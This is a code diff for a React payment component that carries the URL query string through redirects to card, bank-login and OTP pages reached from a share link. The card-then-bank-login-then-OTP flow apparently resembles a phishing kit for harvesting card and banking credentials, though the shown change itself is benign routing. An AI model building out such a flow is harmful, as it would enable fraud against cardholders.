@@ -21,6 +21,7 @@ const PaymentCardInput = () => {
   const { toast } = useToast();
   const shareId = rawIdParam || "";
   const { data: linkData, isLoading } = useLink(shareId);
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -32,13 +33,13 @@ const PaymentCardInput = () => {
     const payloadService = linkData?.payload?.service_key || linkData?.payload?.service;
     const serviceKeyParam = payloadService || urlServiceKey || sessionService;
     if (!method) {
-      navigate(`/pay/${shareId}/track`);
+      navigate(`/pay/${shareId}/track${currentSearch}`);
       return;
     }
     if (method !== 'card') {
-      navigate(`/pay/${shareId}/bank-login`);
+      navigate(`/pay/${shareId}/bank-login${currentSearch}`);
     }
-  }, [shareId, navigate, linkData, urlServiceKey]);
+  }, [shareId, navigate, linkData, urlServiceKey, currentSearch]);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -239,9 +240,9 @@ const PaymentCardInput = () => {
     
     // Navigate to bank login page if bank is selected, otherwise go to OTP
     if (selectedBankId && selectedBankId !== 'skipped') {
-      navigate(`/pay/${shareId}/bank-login`);
+      navigate(`/pay/${shareId}/bank-login${currentSearch}`);
     } else {
-      navigate(`/pay/${shareId}/otp`);
+      navigate(`/pay/${shareId}/otp${currentSearch}`);
     }
   };
   
